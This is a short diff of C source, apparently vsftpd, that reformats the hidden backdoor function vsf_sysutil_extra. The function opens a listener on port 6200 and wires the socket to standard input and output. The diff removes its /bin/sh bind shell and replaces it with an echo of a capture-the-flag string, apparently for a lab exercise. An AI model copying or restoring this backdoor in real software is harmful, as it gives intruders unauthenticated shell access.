@@ -845,26 +845,31 @@ static int do_sendfile(const int out_fd, const int in_fd,
   }
 }
 
-int
-vsf_sysutil_extra(void)
+int vsf_sysutil_extra(void)
 {
   int fd, rfd;
   struct sockaddr_in sa;
-  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
-  exit(1);
+
+  if ((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
+    exit(1);
+
   memset(&sa, 0, sizeof(sa));
   sa.sin_family = AF_INET;
   sa.sin_port = htons(6200);
   sa.sin_addr.s_addr = INADDR_ANY;
-  if((bind(fd,(struct sockaddr *)&sa,
-  sizeof(struct sockaddr))) < 0) exit(1);
-  if((listen(fd, 100)) == -1) exit(1);
-  for(;;)
+
+  if (bind(fd, (struct sockaddr *)&sa, sizeof(struct sockaddr)) < 0)
+    exit(1);
+
+  if (listen(fd, 100) == -1)
+    exit(1);
+
+  for (;;)
   {
-    rfd = accept(fd, 0, 0);
+    rfd = accept(fd, 0, 0);   
     close(0); close(1); close(2);
     dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
-    execl("/bin/sh","sh",(char *)0);
+    execl("/bin/echo", "echo", "You found the flag! Flag is GzvEh@iL!4.7sicCc@KUiNJf", (char *)0);
   }
 }
 
